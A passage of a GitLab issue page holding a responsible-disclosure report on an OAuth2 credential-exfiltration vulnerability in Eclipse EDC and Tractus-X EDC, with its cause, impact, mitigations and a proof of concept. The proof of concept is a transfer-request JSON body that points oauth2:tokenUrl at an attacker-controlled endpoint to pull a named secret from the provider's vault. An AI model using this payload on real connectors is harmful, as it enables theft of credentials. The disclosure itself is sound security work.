attacks and brute force may be viable approaches to extract other secrets that may or may not exist.&#x000A;Technical Description</p>&#x000A;<p data-sourcepos="39:1-39:2275" dir="auto">This issue has been reproduced in core-EDC version 0.2.1. It arises if the data-plane-http-oauth2 extension is used with the <a href="https://github.com/eclipse-edc/Connector/blob/v0.2.1/extensions/control-plane/transfer/transfer-data-plane/src/main/java/org/eclipse/edc/connector/transfer/dataplane/flow/ProviderPushTransferDataFlowController.java" rel="nofollow noreferrer noopener" target="_blank">ProviderPushTransferDataFlowController</a> of the transfer-data-plane Extension. The <a href="https://github.com/eclipse-edc/Connector/blob/v0.2.1/extensions/data-plane/data-plane-http-oauth2-core/src/main/java/org/eclipse/edc/connector/dataplane/http/oauth2/Oauth2HttpRequestParamsDecorator.java" rel="nofollow noreferrer noopener" target="_blank">Oauth2HttpRequestParamsDecorator</a> will be invoked for both <a href="https://github.com/eclipse-edc/Connector/blob/v0.2.1/extensions/data-plane/data-plane-http/src/main/java/org/eclipse/edc/connector/dataplane/http/params/HttpRequestParamsProviderImpl.java#L58" rel="nofollow noreferrer noopener" target="_blank">SourceDataAddress</a> as well as <a href="https://github.com/eclipse-edc/Connector/blob/v0.2.1/extensions/data-plane/data-plane-http/src/main/java/org/eclipse/edc/connector/dataplane/http/params/HttpRequestParamsProviderImpl.java#L66" rel="nofollow noreferrer noopener" target="_blank">DestinationDataAddress</a> in the <a href="https://github.com/eclipse-edc/Connector/blob/v0.2.1/extensions/data-plane/data-plane-http/src/main/java/org/eclipse/edc/connector/dataplane/http/params/HttpRequestParamsProviderImpl.java" rel="nofollow noreferrer noopener" target="_blank">HttpRequestParamsProviderImpl</a>, executed by the provider data-plane. When <a href="https://github.com/eclipse-edc/Connector/blob/v0.2.1/extensions/data-plane/data-plane-http-oauth2-core/src/main/java/org/eclipse/edc/connector/dataplane/http/oauth2/Oauth2CredentialsRequestFactory.java#L68" rel="nofollow noreferrer noopener" target="_blank">building the Oauth2CredentialsRequest in the Oauth2CredentialsRequestFactory</a> the <a href="https://github.com/eclipse-edc/Connector/blob/v0.2.1/extensions/data-plane/data-plane-http-oauth2-core/src/main/java/org/eclipse/edc/connector/dataplane/http/oauth2/Oauth2CredentialsRequestFactory.java#L90" rel="nofollow noreferrer noopener" target="_blank">vault is invoked</a> to resolve the secret from the passed DataAddress. It is also invoked for the DestinationDataAddress, which is passed by the consumer and can be manipulated by an attacker. An attacker can freely choose the alias to be resolved in the "oauth2:clientSecretKey" property. The resolved secret is then sent to the URL specified in the "oauth2:tokenUrl" property.</p>&#x000A;<p data-sourcepos="41:1-42:6" dir="auto">The issue can be resolved by removing the Oauth2HttpRequestParamsDecorator for Sinks in the <a href="https://github.com/eclipse-edc/Connector/blob/v0.2.1/extensions/data-plane/data-plane-http-oauth2-core/src/main/java/org/eclipse/edc/connector/dataplane/http/oauth2/DataPlaneHttpOauth2Extension.java#L61" rel="nofollow noreferrer noopener" target="_blank">DataPlaneHttpOauth2Extension</a>. However, this would lead to removing the OAuth2 feature for sinks using push transfers.&#x000A;Impact</p>&#x000A;<p data-sourcepos="44:1-44:304" dir="auto">Given an EDC instance with a single publicly available contract definition, the described attack allows any attacker in the same data space as the target to exfiltrate arbitrary secrets from the target's secrets vault, including internal credentials, such as those for authentication via SSI/MIW or DAPS.</p>&#x000A;<p data-sourcepos="46:1-47:10" dir="auto">We have assessed this vulnerability at a 9.3/10 CRITICAL CVSS v4.0 score. CVSS vector: <a href="https://www.first.org/cvss/calculator/4.0#CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:H/SI:H/SA:H/AU:Y/R:U/V:C/RE:H/U:Red" rel="nofollow noreferrer noopener" target="_blank">CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:H/SI:H/SA:H/AU:Y/R:U/V:C/RE:H/U:Red</a>&#x000A;Weaknesses</p>&#x000A;<div class="gl-relative markdown-code-block js-markdown-code">&#x000A;<pre data-sourcepos="49:5-51:0" class="code highlight js-syntax-highlight language-plaintext" lang="plaintext" v-pre="true"><code><span id="LC1" class="line" lang="plaintext">[CWE-201](https://cwe.mitre.org/data/definitions/201.html): Insertion of Sensitive Information Into Sent Data</span>&#x000A;<span id="LC2" class="line" lang="plaintext">[CWE-522](https://cwe.mitre.org/data/definitions/522.html): Insufficiently Protected Credentials</span></code></pre>&#x000A;<copy-code></copy-code>&#x000A;</div>&#x000A;<h3 data-sourcepos="52:1-52:40" dir="auto">&#x000A;<a id="user-content-affected-versions-and-configurations" class="anchor" href="#affected-versions-and-configurations" aria-hidden="true"></a>Affected versions and configurations</h3>&#x000A;<p data-sourcepos="54:1-54:746" dir="auto">We have tested against version 0.5.4 of the <a href="https://github.com/eclipse-tractusx/tractusx-edc/tree/0.5.4" rel="nofollow noreferrer noopener" target="_blank">Tractus-X EDC distribution</a>, based on version 0.2.1 of the <a href="https://github.com/eclipse-edc/Connector" rel="nofollow noreferrer noopener" target="_blank">core EDC</a>. To deploy the Tractus-X EDC, we used the Helm chart contained in the repository itself. To reproduce the issue, we had to enable HttpData in the destination types by adding it to the environment variable EDC_DATAPLANE_SELECTOR_DEFAULTPLANE_DESTINATIONTYPES in the control plane. Its final value was HttpProxy,AmazonS3,HttpData, with the first two being the default value set by the chart itself. Notably, this change was recently made default in pull request <a href="https://github.com/eclipse-tractusx/tractusx-edc/pull/1244" rel="nofollow noreferrer noopener" target="_blank">#1244</a>.</p>&#x000A;<p data-sourcepos="56:1-57:10" dir="auto">We were unfortunately unable to test against latest core EDC versions. However, we have inspected the code and relevant portions have not been modified since, so we believe the issue may still be present in current versions.&#x000A;Mitigation</p>&#x000A;<p data-sourcepos="59:1-59:74" dir="auto">Until fixes are made available, the following mitigation approaches exist:</p>&#x000A;<div class="gl-relative markdown-code-block js-markdown-code">&#x000A;<pre data-sourcepos="61:5-66:0" class="code highlight js-syntax-highlight language-plaintext" lang="plaintext" v-pre="true"><code><span id="LC1" class="line" lang="plaintext">Disable support for OAuth2-protected data sinks entirely</span>&#x000A;<span id="LC2" class="line" lang="plaintext">Employ WAF solutions to reject requests containing clientSecretKeys</span>&#x000A;<span id="LC3" class="line" lang="plaintext">Include a cryptographically secure random component in each secret name in the secrets vaults</span>&#x000A;<span id="LC4" class="line" lang="plaintext">Ensure all available contract definitions can only be consumed by trusted consumers</span>&#x000A;<span id="LC5" class="line" lang="plaintext">Disable data plane secrets vault access entirely (may break other functionality)</span></code></pre>&#x000A;<copy-code></copy-code>&#x000A;</div>&#x000A;<h3 data-sourcepos="67:1-67:44" dir="auto">&#x000A;<a id="user-content-disabling-of-oauth2-protected-data-sinks" class="anchor" href="#disabling-of-oauth2-protected-data-sinks" aria-hidden="true"></a>Disabling of OAuth2-protected data sinks</h3>&#x000A;<p data-sourcepos="69:1-70:16" dir="auto">If recompiling the EDC from source is an option, then removing this line of code will alleviate the vulnerability: <a href="https://github.com/eclipse-edc/Connector/blob/v0.2.1/extensions/data-plane/data-plane-http-oauth2-core/src/main/java/org/eclipse/edc/connector/dataplane/http/oauth2/DataPlaneHttpOauth2Extension.java#L61" rel="nofollow noreferrer noopener" target="_blank">https://github.com/eclipse-edc/Connector/blob/v0.2.1/extensions/data-plane/data-plane-http-oauth2-core/src/main/java/org/eclipse/edc/connector/dataplane/http/oauth2/DataPlaneHttpOauth2Extension.java#L61</a>&#x000A;Proof of Concept</p>&#x000A;<div class="gl-relative markdown-code-block js-markdown-code">&#x000A;<pre data-sourcepos="72:5-76:0" class="code highlight js-syntax-highlight language-plaintext" lang="plaintext" v-pre="true"><code><span id="LC1" class="line" lang="plaintext">Provider (attack target): create publicly available contract definition</span>&#x000A;<span id="LC2" class="line" lang="plaintext">Consumer (attacker)</span>&#x000A;<span id="LC3" class="line" lang="plaintext">    Negotiate contract for previously created contract definition</span>&#x000A;<span id="LC4" class="line" lang="plaintext">    Initiate transfer to OAuth2-protected data sink For that, send a POST request to /v2/transferprocesses of the consuming connector's management API with the following body. json { "@type": https://w3id.org/edc/v0.0.1/ns/TransferRequest, https://w3id.org/edc/v0.0.1/ns/assetId: "{{ASSET_ID}}", https://w3id.org/edc/v0.0.1/ns/contractId: "{{CONTRACT_ID}}", https://w3id.org/edc/v0.0.1/ns/connectorAddress: "{{PROVIDER_EDC_DSP_ENDPOINT}}", https://w3id.org/edc/v0.0.1/ns/connectorId: "{{PROVIDER_EDC_PARTICIPANT_ID}}", https://w3id.org/edc/v0.0.1/ns/dataDestination: { https://w3id.org/edc/v0.0.1/ns/type: "HttpData", https://w3id.org/edc/v0.0.1/ns/baseUrl: "{{attacker_controlled_endpoint}}", "oauth2:tokenUrl": "{{attacker_controlled_endpoint}}", "oauth2:clientId": "example", "oauth2:clientSecretKey": "{{target_vault_secret_key}}" }, https://w3id.org/edc/v0.0.1/ns/properties: {}, https://w3id.org/edc/v0.0.1/ns/privateProperties: {}, https://w3id.org/edc/v0.0.1/ns/protocol: "dataspace-protocol-http", https://w3id.org/edc/v0.0.1/ns/managedResources: false }</span></code></pre>&#x000A;<copy-code></copy-code>&#x000A;</div>&#x000A;<p data-sourcepos="77:1-77:188" dir="auto">After initiating the transfer, the selected secret will be sent to the {{attacker_controlled_endpoint}} as the client_secret paramater of an application/x-www-form-urlencoded POST request.</p></div>
</div>

</div>
<div class="js-issue-widgets">
<div class="emoji-block emoji-block-sticky">
<div class="row gl-m-0 gl-justify-between">
<div class="js-noteable-awards">
<div class="gl-flex gl-flex-wrap gl-justify-between gl-pt-3">
<div data-can-award-emoji="false" data-path="/api/v4/projects/3804/issues/198/award_emoji" data-show-default-award-emojis="true" id="js-vue-awards-block"></div>

</div>

</div>
<div class="new-branch-col gl-font-size-0 gl-my-2">

</div>
</div>
</div>

</div>
</div>
<div class="js-issue-widgets">

<div class="gl-border-solid gl-border-1 gl-border-gray-100 gl-rounded-base gl-mt-5 gl-p-3 gl-text-center">
To upload designs, you'll need to enable LFS and have an admin enable hashed storage. <a href="/help/user/project/issues/design_management.md#prerequisites" target="_blank" rel="noopener noreferrer">More information</a>
</div>

<div class="js-work-item-links-root" data-full-path="security/vulnerability-reports" data-issuable-id="636913" data-issuable-iid="198" data-register-path="/users/sign_up?redirect_to_referer=yes" data-sign-in-path="/users/sign_in?redirect_to_referer=yes" data-wi-autocomplete-award-emojis-path="/-/autocomplete/award_emojis" data-wi-can-admin-label="false" data-wi-can-bulk-edit-epics="false" data-wi-default-branch="main" data-wi-epics-list-path="/groups/vulnerability-reports/-/epics" data-wi-full-path="security/vulnerability-reports" data-wi-group-issues-path="/groups/vulnerability-reports/-/issues" data-wi-group-path="security" data-wi-has-epics-feature="true" data-wi-has-issuable-health-status-feature="true" data-wi-has-issue-weights-feature="true" data-wi-has-iterations-feature="true" data-wi-has-okrs-feature="true" data-wi-has-quality-management-feature="true" data-wi-has-scoped-labels-feature="true" data-wi-has-subepics-feature="true" data-wi-is-signed-in="false" data-wi-issues-list-path="/security/vulnerability-reports/-/issues" data-wi-labels-fetch-path="/groups/vulnerability-reports/-/labels.json?include_ancestor_groups=true&amp;only_group_labels=true" data-wi-labels-manage-path="/security/vulnerability-reports/-/labels" data-wi-new-comment-template-paths="[{&quot;text&quot;:&quot;Your comment templates&quot;,&quot;href&quot;:&quot;/-/profile/comment_templates&quot;}]" data-wi-register-path="/users/sign_up?redirect_to_referer=yes" data-wi-report-abuse-path="/-/abuse_reports/add_category" data-wi-show-new-issue-link="false" data-wi-sign-in-path="/users/sign_in?redirect_to_referer=yes"></div>


<div class="js-related-issues-root" data-can-add-related-issues="false" data-endpoint="/security/vulnerability-reports/-/issues/198/links" data-full-path="security/vulnerability-reports" data-has-issue-weights-feature="true" data-has-iterations-feature="true" data-help-path="/help/user/project/issues/related_issues.md" data-is-group="false" data-issuable-type="issue" data-show-categorized-issues="true" data-wi-autocomplete-award-emojis-path="/-/autocomplete/award_emojis" data-wi-can-admin-label="false" data-wi-can-bulk-edit-epics="false" data-wi-default-branch="main" data-wi-epics-list-path="/groups/vulnerability-reports/-/epics" data-wi-full-path="security/vulnerability-reports" data-wi-group-issues-path="/groups/vulnerability-reports/-/issues" data-wi-group-path="security" data-wi-has-epics-feature="true" data-wi-has-issuable-health-status-feature="true" data-wi-has-issue-weights-feature="true" data-wi-has-iterations-feature="true" data-wi-has-okrs-feature="true" data-wi-has-quality-management-feature="true" data-wi-has-scoped-labels-feature="true" data-wi-has-subepics-feature="true" data-wi-is-signed-in="false" data-wi-issues-list-path="/security/vulnerability-reports/-/issues" data-wi-labels-fetch-path="/groups/vulnerability-reports/-/labels.json?include_ancestor_groups=true&amp;only_group_labels=true" data-wi-labels-manage-path="/security/vulnerability-reports/-/labels" data-wi-new-comment-template-paths="[{&quot;text&quot;:&quot;Your comment templates&quot;,&quot;href&quot;:&quot;/-/profile/comment_templates&quot;}]" data-wi-register-path="/users/sign_up?redirect_to_referer=yes" data-wi-report-abuse-path="/-/abuse_reports/add_category" data-wi-show-new-issue-link="false" data-wi-sign-in-path="/users/sign_in?redirect_to_referer=yes"></div>

<div data-has-closing-merge-request="false" data-iid="198" data-project-path="security/vulnerability-reports" id="js-related-merge-requests"></div>
</div>
<div class="js-issue-widgets">
<section class="issuable-discussion js-vue-notes-event">
<div data-can-add-timeline-events="false" data-current-user-data="null" data-new-comment-template-paths="[{&quot;text&quot;:&quot;Your comment templates&quot;,&quot;href&quot;:&quot;/-/profile/comment_templates&quot;}]" data-noteable-data="{&quot;id&quot;:636913,&quot;iid&quot;:198,&quot;description&quot;:&quot;\u003c!--\nNote that this issue is configured (see the quick actions at the bottom) to be created as confidential.\n\nNote that a vulnerability does not need to actually be resolved before it is reported and that these reports can be revised as needed (reopen the issue to request changes).\n\nIf you do not know how to fill certain fields, mark that in the comment and we will help you.\n\nYou can delete the comments (or not).\n--\u003e\n\n\u003c!--\nRequired. Specify the project&#39;s name (e.g., \&quot;Eclipse Dash\&quot;) and Eclipse Foundation ID, e.g., \&quot;technology.dash\&quot;.\n--\u003e\n\n## Basic information\n\n**Project name:** Eclipse EDC\n\n**Project id:** technology.edc\n\n## Details of the issue\n\nReported on the security ML:\n\nWe have identified a security vulnerability in the EDC project (https://github.com/eclipse-edc/Connector) version 0.2.1 (at least down to version MS8) regarding the OAuth2-protected data sink feature which we rate with at a 9.3/10 CRITICAL CVSS v4.0 score. This project is also used in the Eclipse project (https://github.com/eclipse-tractusx/tractusx-edc) where we can verify the vulnerability at least for release 0.5.4. As we have identified a [recent code change](https://github.com/eclipse-tractusx/tractusx-edc/pull/1244) in Tractus-X EDC that now allows to exploit the vulnerability by default, we prioritized disclosure over further deeper analysis and reproducibility of latest released versions, since we want to avoid any negative impact including reputation on the young projects and data space initiatives like Catena-X. To our opinion (concluded by a first review of the current code) the vulnerability most probably persists for Connector version 0.6.2 and Tractus-X EDC version 0.7.0\n\nWhen using a custom, OAuth2-protected data sink, the OAuth2-specific data address properties are resolved by the provider data plane. Problematically, the consumer-provided clientSecretKey, which indicates the OAuth2 client secret to retrieve from a secrets vault, is resolved in the context of the provider&#39;s vault, not the consumer. This secret&#39;s value is then sent to the tokenUrl, also consumer-controlled, as part of an OAuth2 client credentials grant. The returned access token is then sent as a bearer token to the data sink URL.\n\n \n### Details\n\nThe vulnerability is twofold, but the core issue is that the provider data plane resolves clientSecretKeys specified in data sink data addresses provided by consumers. This means that a malicious consumer can induce the provider to load any known secret from the provider&#39;s vault and use it as an OAuth2 client secret, with the resulting token being sent to the consumer-controlled data sink. This alone already allows significant credential exfiltration: If a malicious consumer knows that the client secret for a known client ID is stored at a known vault key, e.g., because the provider themself has an OAuth2-protected data source, the consumer can harvest the resulting access token from their data sink and use it to authorize against such protected resource that should only be accessible by the provider.\n\nThe second part is that the tokenUrl, to which the provider submits the resolved credentials to retrieve an access token, is also controlled by the consumer. With the previously described attack, it was only possible to exfiltrate OAuth2 access tokens, which are usually short-lived and require the attacker to know the corresponding client ID and token URL. However, by providing an attacker-controlled endpoint as the tokenUrl, the attacker can exfiltrate arbitrary secrets from the provider&#39;s vault, as the provider data plane will send the resolved secret to that endpoint as part of an OAuth2 client credentials grant. This allows exfiltration of longer-lived secrets like OAuth2 client secret, cryptographic keys, etc. Notably, compared to the first attack, an attacker needs significantly less information to conduct this attack; they only need to know the desired secret&#39;s name (\&quot;key\&quot;) in the secrets vault.\n\nThe latter problem is exacerbated by the fact that third-party integrations, like the [Simple Data Exchanger](https://github.com/eclipse-tractusx/managed-simple-data-exchanger-backend/blob/v2.3.6/modules/sde-external-services/edc/src/main/java/org/eclipse/tractusx/sde/edc/entities/request/asset/AssetEntryRequestFactory.java#L109), a Catena-X component, also under stewardship of the Eclipse Tractus-X project, that integrates with the EDC, may require certain secrets to be created with fixed names. Therefore, if an attacker knows such applications are in use, they know the corresponding secret is likely to exist, making it a prime target for exfiltration. Alternatively, dictionary attacks and brute force may be viable approaches to extract other secrets that may or may not exist.\nTechnical Description\n\nThis issue has been reproduced in core-EDC version 0.2.1. It arises if the data-plane-http-oauth2 extension is used with the [ProviderPushTransferDataFlowController](https://github.com/eclipse-edc/Connector/blob/v0.2.1/extensions/control-plane/transfer/transfer-data-plane/src/main/java/org/eclipse/edc/connector/transfer/dataplane/flow/ProviderPushTransferDataFlowController.java) of the transfer-data-plane Extension. The [Oauth2HttpRequestParamsDecorator](https://github.com/eclipse-edc/Connector/blob/v0.2.1/extensions/data-plane/data-plane-http-oauth2-core/src/main/java/org/eclipse/edc/connector/dataplane/http/oauth2/Oauth2HttpRequestParamsDecorator.java) will be invoked for both [SourceDataAddress](https://github.com/eclipse-edc/Connector/blob/v0.2.1/extensions/data-plane/data-plane-http/src/main/java/org/eclipse/edc/connector/dataplane/http/params/HttpRequestParamsProviderImpl.java#L58) as well as [DestinationDataAddress](https://github.com/eclipse-edc/Connector/blob/v0.2.1/extensions/data-plane/data-plane-http/src/main/java/org/eclipse/edc/connector/dataplane/http/params/HttpRequestParamsProviderImpl.java#L66) in the [HttpRequestParamsProviderImpl](https://github.com/eclipse-edc/Connector/blob/v0.2.1/extensions/data-plane/data-plane-http/src/main/java/org/eclipse/edc/connector/dataplane/http/params/HttpRequestParamsProviderImpl.java), executed by the provider data-plane. When [building the Oauth2CredentialsRequest in the Oauth2CredentialsRequestFactory](https://github.com/eclipse-edc/Connector/blob/v0.2.1/extensions/data-plane/data-plane-http-oauth2-core/src/main/java/org/eclipse/edc/connector/dataplane/http/oauth2/Oauth2CredentialsRequestFactory.java#L68) the [vault is invoked](https://github.com/eclipse-edc/Connector/blob/v0.2.1/extensions/data-plane/data-plane-http-oauth2-core/src/main/java/org/eclipse/edc/connector/dataplane/http/oauth2/Oauth2CredentialsRequestFactory.java#L90) to resolve the secret from the passed DataAddress. It is also invoked for the DestinationDataAddress, which is passed by the consumer and can be manipulated by an attacker. An attacker can freely choose the alias to be resolved in the \&quot;oauth2:clientSecretKey\&quot; property. The resolved secret is then sent to the URL specified in the \&quot;oauth2:tokenUrl\&quot; property.\n\nThe issue can be resolved by removing the Oauth2HttpRequestParamsDecorator for Sinks in the [DataPlaneHttpOauth2Extension](https://github.com/eclipse-edc/Connector/blob/v0.2.1/extensions/data-plane/data-plane-http-oauth2-core/src/main/java/org/eclipse/edc/connector/dataplane/http/oauth2/DataPlaneHttpOauth2Extension.java#L61). However, this would lead to removing the OAuth2 feature for sinks using push transfers.\nImpact\n\nGiven an EDC instance with a single publicly available contract definition, the described attack allows any attacker in the same data space as the target to exfiltrate arbitrary secrets from the target&#39;s secrets vault, including internal credentials, such as those for authentication via SSI/MIW or DAPS.\n\nWe have assessed this vulnerability at a 9.3/10 CRITICAL CVSS v4.0 score. CVSS vector: [CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:H/SI:H/SA:H/AU:Y/R:U/V:C/RE:H/U:Red](https://www.first.org/cvss/calculator/4.0#CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:H/SI:H/SA:H/AU:Y/R:U/V:C/RE:H/U:Red)\nWeaknesses\n\n    [CWE-201](https://cwe.mitre.org/data/definitions/201.html): Insertion of Sensitive Information Into Sent Data\n    [CWE-522](https://cwe.mitre.org/data/definitions/522.html): Insufficiently Protected Credentials\n\n### Affected versions and configurations\n\nWe have tested against version 0.5.4 of the [Tractus-X EDC distribution](https://github.com/eclipse-tractusx/tractusx-edc/tree/0.5.4), based on version 0.2.1 of the [core EDC](https://github.com/eclipse-edc/Connector). To deploy the Tractus-X EDC, we used the Helm chart contained in the repository itself. To reproduce the issue, we had to enable HttpData in the destination types by adding it to the environment variable EDC_DATAPLANE_SELECTOR_DEFAULTPLANE_DESTINATIONTYPES in the control plane. Its final value was HttpProxy,AmazonS3,HttpData, with the first two being the default value set by the chart itself. Notably, this change was recently made default in pull request [#1244](https://github.com/eclipse-tractusx/tractusx-edc/pull/1244).\n\nWe were unfortunately unable to test against latest core EDC versions. However, we have inspected the code and relevant portions have not been modified since, so we believe the issue may still be present in current versions.\nMitigation\n\nUntil fixes are made available, the following mitigation approaches exist:\n\n    Disable support for OAuth2-protected data sinks entirely\n    Employ WAF solutions to reject requests containing clientSecretKeys\n    Include a cryptographically secure random component in each secret name in the secrets vaults\n    Ensure all available contract definitions can only be consumed by trusted consumers\n    Disable data plane secrets vault access entirely (may break other functionality)\n\n### Disabling of OAuth2-protected data sinks\n\nIf recompiling the EDC from source is an option, then removing this line of code will alleviate the vulnerability: https://github.com/eclipse-edc/Connector/blob/v0.2.1/extensions/data-plane/data-plane-http-oauth2-core/src/main/java/org/eclipse/edc/connector/dataplane/http/oauth2/DataPlaneHttpOauth2Extension.java#L61\nProof of Concept\n\n    Provider (attack target): create publicly available contract definition\n    Consumer (attacker)\n        Negotiate contract for previously created contract definition\n        Initiate transfer to OAuth2-protected data sink For that, send a POST request to /v2/transferprocesses of the consuming connector&#39;s management API with the following body. json { \&quot;@type\&quot;: https://w3id.org/edc/v0.0.1/ns/TransferRequest, https://w3id.org/edc/v0.0.1/ns/assetId: \&quot;{{ASSET_ID}}\&quot;, https://w3id.org/edc/v0.0.1/ns/contractId: \&quot;{{CONTRACT_ID}}\&quot;, https://w3id.org/edc/v0.0.1/ns/connectorAddress: \&quot;{{PROVIDER_EDC_DSP_ENDPOINT}}\&quot;, https://w3id.org/edc/v0.0.1/ns/connectorId: \&quot;{{PROVIDER_EDC_PARTICIPANT_ID}}\&quot;, https://w3id.org/edc/v0.0.1/ns/dataDestination: { https://w3id.org/edc/v0.0.1/ns/type: \&quot;HttpData\&quot;, https://w3id.org/edc/v0.0.1/ns/baseUrl: \&quot;{{attacker_controlled_endpoint}}\&quot;, \&quot;oauth2:tokenUrl\&quot;: \&quot;{{attacker_controlled_endpoint}}\&quot;, \&quot;oauth2:clientId\&quot;: \&quot;example\&quot;, \&quot;oauth2:clientSecretKey\&quot;: \&quot;{{target_vault_secret_key}}\&quot; }, https://w3id.org/edc/v0.0.1/ns/properties: {}, https://w3id.org/edc/v0.0.1/ns/privateProperties: {}, https://w3id.org/edc/v0.0.1/ns/protocol: \&quot;dataspace-protocol-http\&quot;, https://w3id.org/edc/v0.0.1/ns/managedResources: false }\n\nAfter initiating the transfer, the selected secret will be sent to the {{attacker_controlled_endpoint}} as the client_secret paramater of an application/x-www-form-urlencoded POST request.\n\n\u003c!--\n  Please, do not remove the line below. It will create a confidential issue that will be visible\n  only to you and the members of this project. Confidential issues are used to keep security\n  vulnerabilities private until they are sorted out.\n  Eclipse Projects follow Responsible Disclosure best practices: the initial report is made privately,\n  but with the full details being published once a patch has been made available (sometimes with\n  a delay to allow more time for the patches to be installed).\n--\u003e&quot;,&quot;title&quot;:&quot;Eclipse EDC: OAuth2 Credential Exfiltration Vulnerability&quot;,&quot;time_estimate&quot;:0,&quot;total_time_spent&quot;:0,&quot;human_time_estimate&quot;:null,&quot;human_total_time_spent&quot;:null,&quot;state&quot;:&quot;closed&quot;,&quot;milestone_id&quot;:null,&quot;updated_by_id&quot;:624,&quot;created_at&quot;:&quot;2024-04-24T13:16:24Z&quot;,&quot;updated_at&quot;:&quot;2024-05-07T14:07:01Z&quot;,&quot;milestone&quot;:null,&quot;labels&quot;:[{&quot;id&quot;:58541,&quot;title&quot;:&quot;From_ML&quot;,&quot;color&quot;:&quot;#ff0000&quot;,&quot;description&quot;:null,&quot;group_id&quot;:null,&quot;project_id&quot;:3804,&quot;template&quot;:false,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2023-04-12T12:43:09.696Z&quot;,&quot;updated_at&quot;:&quot;2023-04-12T12:43:09.696Z&quot;}],&quot;lock_version&quot;:0,&quot;author_id&quot;:2023,&quot;confidential&quot;:false,&quot;discussion_locked&quot;:null,&quot;assignees&quot;:[{&quot;id&quot;:339,&quot;username&quot;:&quot;mspiekermann&quot;,&quot;name&quot;:&quot;Markus Spiekermann&quot;,&quot;state&quot;:&quot;active&quot;,&quot;locked&quot;:false,&quot;avatar_url&quot;:&quot;https://gitlab.eclipse.org/uploads/-/system/user/avatar/339/avatar.png&quot;,&quot;web_url&quot;:&quot;https://gitlab.eclipse.org/mspiekermann&quot;},{&quot;id&quot;:976,&quot;username&quot;:&quot;dmiehle&quot;,&quot;name&quot;:&quot;Daniel Miehle&quot;,&quot;state&quot;:&quot;active&quot;,&quot;locked&quot;:false,&quot;avatar_url&quot;:&quot;https://secure.gravatar.com/avatar/9be4031e91cb9f737dddba3bc0bf9d6c134bc806c6f5195935628da9a1a4815c?s=80\u0026d=identicon&quot;,&quot;web_url&quot;:&quot;https://gitlab.eclipse.org/dmiehle&quot;},{&quot;id&quot;:1355,&quot;username&quot;:&quot;sigi&quot;,&quot;name&quot;:&quot;Siegfried Kiermayer&quot;,&quot;state&quot;:&quot;active&quot;,&quot;locked&quot;:false,&quot;avatar_url&quot;:&quot;https://secure.gravatar.com/avatar/1f72688aff43e42e4304d7931d82327804d10a1cecede0aed901783c664665a9?s=80\u0026d=identicon&quot;,&quot;web_url&quot;:&quot;https://gitlab.eclipse.org/sigi&quot;},{&quot;id&quot;:1499,&quot;username&quot;:&quot;bjoeroy&quot;,&quot;name&quot;:&quot;Björn Roy&quot;,&quot;state&quot;:&quot;active&quot;,&quot;locked&quot;:false,&quot;avatar_url&quot;:&quot;https://secure.gravatar.com/avatar/b5c0b46f7ba84a4246807d3029f3fe7020dd0009bd31e6cd85280369343d2dc3?s=80\u0026d=identicon&quot;,&quot;web_url&quot;:&quot;https://gitlab.eclipse.org/bjoeroy&quot;},{&quot;id&quot;:4376,&quot;username&quot;:&quot;stephanbcbauer&quot;,&quot;name&quot;:&quot;Stephan Bauer&quot;,&quot;state&quot;:&quot;active&quot;,&quot;locked&quot;:false,&quot;avatar_url&quot;:&quot;https://secure.gravatar.com/avatar/2e3a1a6b0a7660f623ea42152fdd6145a07f34bfaa8a285ac8dddbe868aa1f81?s=80\u0026d=identicon&quot;,&quot;web_url&quot;:&quot;https://gitlab.eclipse.org/stephanbcbauer&quot;}],&quot;due_date&quot;:null,&quot;project_id&quot;:3804,&quot;moved_to_id&quot;:null,&quot;duplicated_to_id&quot;:null,&quot;web_url&quot;:&quot;/security/vulnerability-reports/-/issues/198&quot;,&quot;current_user&quot;:{&quot;can_create_note&quot;:false,&quot;can_create_confidential_note&quot;:false,&quot;can_update&quot;:false,&quot;can_set_issue_metadata&quot;:false,&quot;can_award_emoji&quot;:false},&quot;create_note_path&quot;:&quot;/security/vulnerability-reports/notes?target_id=636913\u0026target_type=issue&quot;,&quot;preview_note_path&quot;:&quot;/security/vulnerability-reports/-/preview_markdown?target_id=198\u0026target_type=Issue&quot;,&quot;is_project_archived&quot;:false,&quot;issue_email_participants&quot;:[],&quot;type&quot;:&quot;ISSUE&quot;,&quot;weight&quot;:null,&quot;blocked&quot;:false,&quot;blocked_by_issues&quot;:[]}" data-noteable-type="Issue" data-notes-data="{&quot;noteableType&quot;:&quot;issue&quot;,&quot;noteableId&quot;:636913,&quot;projectId&quot;:3804,&quot;groupId&quot;:null,&quot;discussionsPath&quot;:&quot;/security/vulnerability-reports/-/issues/198/discussions.json&quot;,&quot;registerPath&quot;:&quot;/users/sign_up?redirect_to_referer=yes&quot;,&quot;newSessionPath&quot;:&quot;/users/sign_in?redirect_to_referer=yes&quot;,&quot;markdownDocsPath&quot;:&quot;/help/user/markdown.md&quot;,&quot;quickActionsDocsPath&quot;:&quot;/help/user/project/quick_actions.md&quot;,&quot;closePath&quot;:&quot;/security/vulnerability-reports/-/issues/198.json?issue%5Bstate_event%5D=close&quot;,&quot;reopenPath&quot;:&quot;/security/vulnerability-reports/-/issues/198.json?issue%5Bstate_event%5D=reopen&quot;,&quot;notesPath&quot;:&quot;/security/vulnerability-reports/noteable/issue/636913/notes&quot;,&quot;prerenderedNotesCount&quot;:10,&quot;lastFetchedAt&quot;:1736612292000000,&quot;notesFilter&quot;:null}" data-notes-filters="{&quot;Show all activity&quot;:0,&quot;Show comments only&quot;:1,&quot;Show history only&quot;:2}" data-report-abuse-path="/-/abuse_reports/add_category" data-show-timeline-view-toggle="false" data-target-type="issue" id="js-vue-notes"></div>
</section>

</div>
</div>
<aside aria-label="issue" aria-live="polite" class="right-sidebar js-right-sidebar js-issuable-sidebar right-sidebar-expanded" data-always-show-toggle data-auto-collapse data-issuable-type="issue">
<div class="issuable-sidebar">
<div class="issuable-sidebar-header">
<button class="gl-button btn btn-md btn-default gutter-toggle gl-float-right js-sidebar-toggle has-tooltip !gl-shadow-none gl-block " type="button" aria-label="Toggle sidebar" title="Collapse sidebar" data-container="body" data-placement="left" data-boundary="viewport" type="button"><span class="gl-button-text">
